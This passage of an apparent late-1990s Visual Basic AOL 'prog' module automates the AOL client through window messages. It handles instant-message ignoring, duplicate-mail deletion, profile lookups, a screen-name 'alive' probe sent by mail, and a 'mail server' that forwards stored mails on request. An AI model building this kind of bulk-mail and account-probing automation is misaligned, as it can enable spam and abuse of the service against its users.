                        TimeOut 0.65
                        Call SendMessage(iCheck&, BM_GETCHECK, 0&, 0&)
                        Call PostMessage(iCheck&, WM_LBUTTONDOWN, 0&, 0&)
                        DoEvents
                        Call PostMessage(iCheck&, WM_LBUTTONUP, 0&, 0&)
                        'DoEvents
                     'Loop Until a& <> 0&
                DoEvents
                Call PostMessage(iWindow&, WM_CLOSE, 0&, 0&)
                DoEvents
                Exit Sub
            End If
        Next index&
        Call CloseHandle(mThread)
    End If
End Sub


Public Sub IE_Site(Frm As Form, Site As String)
Dim IE As Long
IE = ShellExecute(Frm.hwnd, "Open", Site, vbNullString, vbNullString, SW_SHOWMAXIMIZED)
End Sub

Public Sub IM_Ignore(Who As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call Keyword("aol://9293:$IM_OFF " & Who$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, "Ignore")
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub

Public Sub IM_UnIgnore(Who As String)
    Dim AOL As Long, MDI As Long, im As Long, Rich As Long
    Dim SendButton As Long, OK As Long, Button As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Call Keyword("aol://9293:$IM_ON " & Who$)
    Do
        DoEvents
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
        Rich& = FindWindowEx(im&, 0&, "RICHCNTL", vbNullString)
        SendButton& = FindWindowEx(im&, 0&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(im&, SendButton&, "_AOL_Icon", vbNullString)
    Loop Until im& <> 0& And Rich& <> 0& And SendButton& <> 0&
    Call SendMessageByString(Rich&, WM_SETTEXT, 0&, "Unignore")
    Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
    Do
        DoEvents
        OK& = FindWindow("#32770", "America Online")
        im& = FindWindowEx(MDI&, 0&, "AOL Child", "Send Instant Message")
    Loop Until OK& <> 0& Or im& = 0&
    If OK& <> 0& Then
        Button& = FindWindowEx(OK&, 0&, "Button", vbNullString)
        Call PostMessage(Button&, WM_KEYDOWN, VK_SPACE, 0&)
        Call PostMessage(Button&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(im&, WM_CLOSE, 0&, 0&)
    End If
End Sub


Public Function IsFileThere(TheFile As String) As Boolean
    If Len(TheFile$) = 0 Then
        IsFileThere = False
        Exit Function
    End If
    If Len(Dir$(TheFile$)) Then
        IsFileThere = True
    Else
        IsFileThere = False
    End If
End Function

Public Function AliveCheck(ScreenName As String) As Boolean
    Dim AOL As Long, MDI As Long, ErrorWindow As Long
    Dim ErrorTextWindow As Long, ErrorString As String
    Dim MailWindow As Long, NoWindow As Long, NoButton As Long
    Call Mail_Send("*, " & ScreenName$, "Checking if you're alive. . .", "Are you dead or alive?")
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Do
        DoEvents
        ErrorWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        ErrorTextWindow& = FindWindowEx(ErrorWindow&, 0&, "_AOL_View", vbNullString)
        ErrorString$ = GetText(ErrorTextWindow&)
    Loop Until ErrorWindow& <> 0 And ErrorTextWindow& <> 0 And ErrorString$ <> ""
    If InStr(ErrorString$, ScreenName$) Then
        AliveCheck = False
        GoTo Done
     End If
        AliveCheck = True
Done:
    MailWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Write Mail")
    Call PostMessage(ErrorWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Call PostMessage(MailWindow&, WM_CLOSE, 0&, 0&)
    DoEvents
    Do
        DoEvents
        NoWindow& = FindWindow("#32770", "America Online")
        NoButton& = FindWindowEx(NoWindow&, 0&, "Button", "&No")
    Loop Until NoWindow& <> 0& And NoButton& <> 0
    Call SendMessage(NoButton&, WM_KEYDOWN, VK_SPACE, 0&)
    Call SendMessage(NoButton&, WM_KEYUP, VK_SPACE, 0&)
End Function
Public Sub Kill_SaveMail()
'kills save mail? box
Dim Saveb As Long, Butin As Long
    Saveb& = FindWindow("#32770", "AOL Mail")
    Butin& = FindWindowEx(Saveb&, 0&, "Button", vbNullString)
    Butin& = FindWindowEx(Butin&, Butin&, "Button", vbNullString)
    If Saveb& <> 0 And Butin <> 0 Then
    Do
    DoEvents
        Call SendMessage(Butin&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(Butin&, WM_KEYUP, VK_SPACE, 0&)
    Loop Until Saveb = 0&
    End If
End Sub

Public Function Mail_Count() As Integer
Dim MailBox As Long, TabControl As Long, TabPage As Long
Dim Tree As Long, Count As Integer
    MailBox& = FindMailBox&
    If MailBox& = 0& Then Exit Function
    DoEvents
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    Tree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count = SendMessage(Tree&, LB_GETCOUNT, 0&, 0&)
Mail_Count = Count
End Function

Public Sub Mail_KillDupes()
Dim Count As Integer, Del As Long, TabControl As Long, TabPage As Long
Dim Tree As Long, i As Integer, J As Integer, sLength As Integer, MyString As String
Dim MyString2 As String, Spot As Long, MailBox As Long, Spot2 As Long
MailBox& = FindMailBox&
If FindMailBox& = 0 Then Exit Sub
Count = Mail_Count
Del& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", UserSN & "'s Online Mailbox")
Del& = FindWindowEx(MailBox&, Del&, "_AOL_Icon", vbNullString)
Del& = FindWindowEx(MailBox&, Del&, "_AOL_Icon", vbNullString)
Del& = FindWindowEx(MailBox&, Del&, "_AOL_Icon", vbNullString)
If Count = 0 Then MsgBox "You have no Mail.", 12, "Mail Dupe Killer": Exit Sub
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    Tree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
' Killing
For i = 0 To Count - 1
        sLength = SendMessage(Tree&, LB_GETTEXTLEN, i, 0&)
        MyString$ = String(sLength + 1, 0)
        Call SendMessageByString(Tree&, LB_GETTEXT, i, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
    For J = 0 To Count - 1
        sLength = SendMessage(Tree&, LB_GETTEXTLEN, J, 0&)
        MyString2$ = String(sLength + 1, 0)
        Call SendMessageByString(Tree&, LB_GETTEXT, J, MyString2$)
        Spot2& = InStr(MyString2$, Chr(9))
        Spot2& = InStr(Spot2& + 1, MyString2$, Chr(9))
        MyString2$ = Right(MyString2$, Len(MyString2$) - Spot2&)
        If MyString2$ = MyString$ Then
             Call SendMessage(Tree, LB_SETCURSEL, J, 0&)
             TimeOut 0.01
             Call SendMessage(Del&, WM_LBUTTONDOWN, 0&, 0&)
             Call SendMessage(Del&, WM_LBUTTONUP, 0&, 0&)
             TimeOut 0.1
        End If
    Next J
Next i
End Sub


Public Sub Mail_Search(Search As String)
On Error Resume Next
    Dim MailBox As Long, TabControl As Long, TabPage As Long
    Dim mTree As Long, Mails As Long, sLength As Long
    Dim Spot As Long, MyString As String, Count As Long, Q As Long
    MailBox& = FindMailBox&
    If FindMailBox& = 0& Then Call Mail_Open: TimeOut (1#)
    DoEvents
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& = 0 Then Exit Sub
    For Mails& = 0 To Count& - 1
        DoEvents
        sLength& = SendMessage(mTree&, LB_GETTEXTLEN, Mails&, 0&)
        MyString$ = String(sLength& + 1, 0)
        Call SendMessageByString(mTree&, LB_GETTEXT, Mails&, MyString$)
        Spot& = InStr(MyString$, Chr(9))
        Spot& = InStr(Spot& + 1, MyString$, Chr(9))
        MyString$ = Right(MyString$, Len(MyString$) - Spot&)
        If InStr(LCase(MyString$), LCase(Search)) Then
           Call SendMessage(mTree&, LB_SETCURSEL, Mails&, 0&)
           MsgBox "Search for " + Search + " was found!", vbOKOnly, "HackMaNz Mail Searcher"
       End If
        DoEvents
    Next Mails&
MsgBox "No more matches", 16, "HackMaNz Mail Searcher"
End Sub

Public Sub Mail_Server(Who As String, Message As String, MailNumber)
    Dim MailBox As Long, TabControl As Long, TabPage As Long, Error As Long
    Dim mTree As Long, Count As Long, Forward As Long, Read As Long
    Dim OpenForward As Long, OpenSend As Long, SendButton As Long
    Dim DoIt As Long, EditTo As Long, EditCC As Long, AOL As Long, MDI As Long
    Dim EditSubject As Long, Rich As Long, fCombo As Long
    Dim Combo As Long, Button1 As Long, Button2 As Long, Number As Integer
    Dim TempSubject As String, KeepNew As Long, Modal As Long, mIcon As Long
    Dim AORich As Long, AORich2 As Long, Dead As Long, Deadb As Long
    TimeOut 0.2
    
    Dead& = FindWindow("#32770", "America Online")
    Deadb& = FindWindowEx(Dead&, 0&, "Button", "OK")
    
    DoEvents
    MailBox& = FindMailBox
    If MailBox& = 0& Then
    Call Mail_Open
    Do
    DoEvents
    TimeOut 5
    Loop Until MailBox& <> 0
    TimeOut 1
    End If
    DoEvents
    TabControl& = FindWindowEx(MailBox&, 0&, "_AOL_TabControl", vbNullString)
    TabPage& = FindWindowEx(TabControl&, 0&, "_AOL_TabPage", vbNullString)
    mTree& = FindWindowEx(TabPage&, 0&, "_AOL_Tree", vbNullString)
    Count& = SendMessage(mTree&, LB_GETCOUNT, 0&, 0&)
    If Count& < MailNumber Then Exit Sub
    Call SendMessage(mTree&, LB_SETCURSEL, MailNumber - 1, 0&)
    Read& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", vbNullString)
      Call SendMessage(Read&, WM_LBUTTONDOWN, 0&, 0&)
      Call SendMessage(Read&, WM_LBUTTONUP, 0&, 0&)
Do
DoEvents
Loop Until FindForwardWindow <> 0&
      Forward& = FindWindowEx(FindForwardWindow, 0&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      If AOL_Version = "5" Then Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      'TimeOut 1.2
      'Call killwait
      TimeOut 0.5
      Do
      DoEvents
      Loop Until Forward& <> 0&
      Call WaitForMailtoOpen
      TimeOut 1
      Call SendMessage(Forward&, WM_LBUTTONDOWN, 0&, 0&)
      Call SendMessage(Forward&, WM_LBUTTONUP, 0&, 0&)
    Do
    DoEvents
    Loop Until FindSendWindow& <> 0&
    Do
      DoEvents
        OpenSend& = FindSendWindow
        EditTo& = FindWindowEx(OpenSend&, 0&, "_AOL_Edit", vbNullString)
        EditCC& = FindWindowEx(OpenSend&, EditTo&, "_AOL_Edit", vbNullString)
        EditSubject& = FindWindowEx(OpenSend&, EditCC&, "_AOL_Edit", vbNullString)
        Rich& = FindWindowEx(OpenSend&, 0&, "RICHCNTL", vbNullString)
        Combo& = FindWindowEx(OpenSend&, 0&, "_AOL_Combobox", vbNullString)
        fCombo& = FindWindowEx(OpenSend&, 0&, "_AOL_Fontcombo", vbNullString)
        Button1& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Button2& = FindWindowEx(OpenSend&, Button1&, "_AOL_Icon", vbNullString)
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Number = 13
        If AOL_Version = "4" Then Number = 11
        For DoIt& = 1 To Number
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
    Loop Until OpenSend& <> 0& And EditTo& <> 0& And EditCC& <> 0& And EditSubject& <> 0& And Rich& <> 0& And SendButton& <> 0& And Combo& <> 0& And fCombo& <> 0& & SendButton& <> Button1& And SendButton& <> Button2&
        TempSubject$ = GetText(EditSubject&)
        TempSubject$ = Right(TempSubject$, Len(TempSubject$) - 5)
        Call SendMessageByString(EditSubject&, WM_SETTEXT, 0, TempSubject$)
    Call SendMessageByString(EditTo&, WM_SETTEXT, 0, Who$)
    Call SendMessageByString(Rich&, WM_SETTEXT, 0, Message$)
    Do Until OpenSend& = 0& Or Error& <> 0&
        AOL& = FindWindow("AOL Frame25", vbNullString)
        MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
        Error& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
        OpenSend& = FindSendWindow
        SendButton& = FindWindowEx(OpenSend&, 0&, "_AOL_Icon", vbNullString)
        Number = 13
        If AOL_Version = "4" Then Number = 11
        For DoIt& = 1 To Number
            SendButton& = FindWindowEx(OpenSend&, SendButton&, "_AOL_Icon", vbNullString)
        Next DoIt&
        Call SendMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
        Call PostMessage(FindForwardWindow&, WM_CLOSE, 0&, 0&)
    Loop
    If OpenSend& = 0& Then Call PostMessage(OpenForward&, WM_CLOSE, 0&, 0&)
Do
DoEvents
Loop Until FindForwardWindow& = 0
KeepNew& = FindWindowEx(MailBox&, 0&, "_AOL_Icon", UserSN & "'s Online Mailbox")
KeepNew& = FindWindowEx(MailBox&, KeepNew&, "_AOL_Icon", vbNullString)
KeepNew& = FindWindowEx(MailBox&, KeepNew&, "_AOL_Icon", vbNullString)
KeepNew& = FindWindowEx(MailBox&, KeepNew&, "_AOL_Icon", vbNullString)
Call SendMessage(KeepNew&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(KeepNew&, WM_LBUTTONUP, 0&, 0&)
Modal& = FindWindow("_AOL_Modal", vbNullString)
mIcon& = FindWindowEx(Modal&, 0&, "_AOL_Icon", vbNullString)
If mIcon& <> 0 Then
DoEvents
        Call SendMessage(mIcon&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(mIcon&, WM_LBUTTONUP, 0&, 0&)
    Dead& = FindWindow("#32770", "America Online")
    Deadb& = FindWindowEx(Dead&, 0&, "Button", "OK")
    If Deadb& <> 0 Then
        Call SendMessage(Deadb&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(Deadb&, WM_KEYUP, VK_SPACE, 0&)
         SendChat ascii + Who + ", unable to send [" + MailNumber + "] - dead mail"
         Call PostMessage(OpenSend&, WM_CLOSE, 0&, 0&)
         Call Kill_SaveMail
         Exit Sub
    End If
        If mIcon& > 0 Then
            If Deadb& <> 0 Then
                Call SendMessage(Deadb&, WM_KEYDOWN, VK_SPACE, 0&)
                Call SendMessage(Deadb&, WM_KEYUP, VK_SPACE, 0&)
                SendChat ascii + Who + ", unable to send [" + MailNumber + "] - dead mail"
                Call PostMessage(OpenSend&, WM_CLOSE, 0&, 0&)
                Call Kill_SaveMail
                Exit Sub
            End If
            Call SendMessage(mIcon&, WM_LBUTTONDOWN, 0&, 0&)
            Call SendMessage(mIcon&, WM_LBUTTONUP, 0&, 0&)
        End If
End If
SendChat ascii & Who & " [" & MailNumber + "] was sent"
End Sub


Public Function FindForwardWindow() As Long
    Dim AOL As Long, MDI As Long, Child As Long
    Dim Rich1 As Long, Rich2 As Long, Combo As Long
    Dim FontCombo As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich1& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
    Rich2& = FindWindowEx(Child&, Rich1&, "RICHCNTL", vbNullString)
    Combo& = FindWindowEx(Child&, 0&, "_AOL_Combobox", vbNullString)
    FontCombo& = FindWindowEx(Child&, 0&, "_AOL_FontCombo", vbNullString)
    If Rich1& <> 0& And Rich2& = 0& And Combo& = 0& And FontCombo& = 0& Then
        FindForwardWindow& = Child&
        Exit Function
    Else
        Do
            Child& = FindWindowEx(MDI&, Child&, "AOL Child", vbNullString)
            Rich1& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
            Rich2& = FindWindowEx(Child&, Rich1&, "RICHCNTL", vbNullString)
            Combo& = FindWindowEx(Child&, 0&, "_AOL_Combobox", vbNullString)
            FontCombo& = FindWindowEx(Child&, 0&, "_AOL_FontCombo", vbNullString)
            If Rich1& <> 0& And Rich2& = 0& And Combo& = 0& And FontCombo& = 0& Then
                FindForwardWindow& = Child&
                Exit Function
            End If
        Loop Until Child& = 0&
    End If
    FindForwardWindow& = 0&
End Function

Public Function FindSendWindow() As Long
    Dim AOL As Long, MDI As Long, Child As Long
    Dim SendStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    SendStatic& = FindWindowEx(Child&, 0&, "_AOL_Static", "Send Now")
    If SendStatic& <> 0& Then
        FindSendWindow& = Child&
        Exit Function
    Else
        Do
            Child& = FindWindowEx(MDI&, Child&, "AOL Child", vbNullString)
            SendStatic& = FindWindowEx(Child&, 0&, "_AOL_Static", "Send Now")
            If SendStatic& <> 0& Then
                FindSendWindow& = Child&
                Exit Function
            End If
        Loop Until Child& = 0&
    End If
    FindSendWindow& = 0&
End Function
Public Sub AOL_MakeParent(ChildWin As Long)
' This will make AOL's Window a parent for your VB form
Dim AOL As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    Call SetParent(ChildWin, AOL&)
End Sub

Public Sub MakeListText(list As ListBox, Text As TextBox)
' This takes all the names in a listbox and it turns them into
' a textbox with a commo after each name

Dim i As Integer
For i = 0 To list.ListCount - 1
Text = Text + list.list(i) + ", "
Next i
End Sub

Public Sub MakeListFromMail(ListBox As ListBox, ServerName As TextBox)
' This takes the test from and open Served List mail and it adds the list to
' a VB Listbox
On Error Resume Next
Dim AOL As Long, MDI As Long, Child As Long, Rich As Long, server As String
Dim mWin As Long, list As String, It As String, TheChar As String, Serve As String
Dim TheChars As String, TheMail As String, FindChar As Integer
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    mWin& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
    If mWin = 0 Then MsgBox "Please open mail with list.":  Exit Sub
    list = GetText(mWin)
    Serve = Left(list, 260)
    server = Mid(Serve, InStr(Serve, "From"), 18)
    server = Right(server, Len(server) - 6)
    ServerName = server
    It = Mid(list, InStr(list, "0) "), Len(list))
    If It = "" Then It = Mid(list, InStr(list, "1) "), Len(list))
    If It = "" Then It = Mid(list, InStr(list, "0.) "), Len(list))
    If It = "" Then It = Mid(list, InStr(list, "1.) "), Len(list))
    If It = "" Then It = Mid(list, InStr(list, "1] "), Len(list))
    If It = "" Then It = Mid(list, InStr(list, "0]) "), Len(list))
    For FindChar = 1 To Len(It)
    TheChar = Mid(It, FindChar, 1)
    TheChars = TheChars & TheChar
    If TheChar = Chr(13) Then
    TheMail = Mid(TheChars, 1, Len(TheChars) - 1)
    TheMail = Right(TheMail, Len(TheMail) - 1)
    ListBox.AddItem TheMail
    TheChars = ""
    End If
    Next FindChar
End Sub

Public Function GetRGB(ByVal CVal As Long) As COLORRGB
' This is used for Fade Form
  GetRGB.Blue = Int(CVal / 65536)
  GetRGB.Green = Int((CVal - (65536 * GetRGB.Blue)) / 256)
  GetRGB.Red = CVal - (65536 * GetRGB.Blue + 256 * GetRGB.Green)
End Function

Public Function Member_Profile(Who As String) As String
    Dim AOL As Long, Tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, Modl As Long
    Dim MDI As Long, pgWindow As Long, pgEdit As Long, pgButton As Long
    Dim pWindow As Long, pTextWindow As Long, Prof As String
    Dim NoWindow As Long, OKButton As Long, CurPos As POINTAPI
    Dim WinVis As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(Tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
        Modl& = FindWindow("#32768", vbNullString)
    Loop Until Modl& = 1
    Call PostMessage(Modl&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(Modl&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(Modl&, WM_KEYDOWN, VK_UP, 0&)
    Call PostMessage(Modl&, WM_KEYUP, VK_UP, 0&)
    Call PostMessage(Modl&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(Modl&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        pgWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Get a Member's Profile")
        pgEdit& = FindWindowEx(pgWindow&, 0&, "_AOL_Edit", vbNullString)
        pgButton& = FindWindowEx(pgWindow&, 0&, "_AOL_Icon", vbNullString)
    Loop Until pgWindow& <> 0& And pgEdit& <> 0& And pgButton& <> 0&
    Call SendMessageByString(pgEdit&, WM_SETTEXT, 0&, Who$)
    Call SendMessage(pgButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(pgButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Do
        DoEvents
        pWindow& = FindWindowEx(MDI&, 0&, "AOL Child", "Member Profile")
        pTextWindow& = FindWindowEx(pWindow&, 0&, "_AOL_View", vbNullString)
        Prof$ = GetText(pTextWindow&)
        NoWindow& = FindWindow("#32770", "America Online")
    Loop Until pWindow& <> 0& And pTextWindow& <> 0& Or NoWindow& <> 0&
    DoEvents
    If NoWindow& <> 0& Then
        OKButton& = FindWindowEx(NoWindow&, 0&, "Button", "OK")
        Call SendMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        Member_Profile$ = "No Profile"
    Exit Function
    End If
        Call PostMessage(pWindow&, WM_CLOSE, 0&, 0&)
        Call PostMessage(pgWindow&, WM_CLOSE, 0&, 0&)
        Member_Profile$ = Prof$
End Function

Public Sub Mail_ServerFlash(Who As String, Message As String, MailNumber)
    Dim fMail As Long, Error As Long, Number As Integer
    Dim fList As Long, Count As Long, Forward As Long, Read As Long
    Dim OpenForward As Long, OpenSend As Long, SendButton As Long
    Dim DoIt As Long, EditTo As Long, EditCC As Long, AOL As Long, MDI As Long
    Dim EditSubject As Long, Rich As Long, fCombo As Long
    Dim Combo As Long, Button1 As Long, Button2 As Long, Dead As Long, Deadb As Long
    Dim TempSubject As String, KeepNew As Long, Modal As Long, mIcon As Long
    Dim AORich As Long, AORich2 As Long

    AOL& = FindWindow("AOL Frame25", vbNullString)
    Dead& = FindWindow("#32770", "America Online")
    Deadb& = FindWindowEx(Dead&, 0&, "Button", "OK")
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    fMail& = FindWindowEx(MDI&, 0&, "AOL Child", "Incoming/Saved Mail")
    If fMail& = 0& Then Exit Sub
    fList& = FindWindowEx(fMail&, 0&, "_AOL_Tree", vbNullString)
    If fList = 0 Then MsgBox "Please open Incoming/Saved mail", 16: Exit Sub
    Count& = SendMessage(fList&, LB_GETCOUNT, 0&, 0&)
    
    If Count& < MailNumber Then Exit Sub
    Call SendMessage(fList&, LB_SETCURSEL, MailNumber - 1, 0&)
    Read& = FindWindowEx(fMail&, 0&, "_AOL_Icon", vbNullString)
      Call SendMessage(Read&, WM_LBUTTONDOWN, 0&, 0&)
      Call SendMessage(Read&, WM_LBUTTONUP, 0&, 0&)
      TimeOut 0.01
Do
DoEvents
    Dead& = FindWindow("#32770", "America Online")
    Deadb& = FindWindowEx(Dead&, 0&, "Button", "OK")
    If Deadb& <> 0 Then
        Call SendMessage(Deadb&, WM_KEYDOWN, VK_SPACE, 0&)
        Call SendMessage(Deadb&, WM_KEYUP, VK_SPACE, 0&)
        SendChat ascii + Who + ", unable to send [" + MailNumber + "] - dead mail"
        Exit Sub
      End If
Loop Until FindForwardWindow <> 0
TimeOut 0.25
      Forward& = FindWindowEx(FindForwardWindow, 0&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      If AOL_Version = "5" Then Forward& = FindWindowEx(FindForwardWindow, Forward&, "_AOL_Icon", vbNullString)
      'TimeOut 1
      'Call killwait
      Do
      DoEvents
      Loop Until Forward& <> 0&
      Call WaitForMailtoOpen
      TimeOut 0.15
      Call SendMessage(Forward&, WM_LBUTTONDOWN, 0&, 0&)
      Call SendMessage(Forward&, WM_LBUTTONUP, 0&, 0&)
    Do
    DoEvents
    Loop Until FindSendWindow& = 1
    Do
      DoEvents
        OpenSend& = FindSendWindow
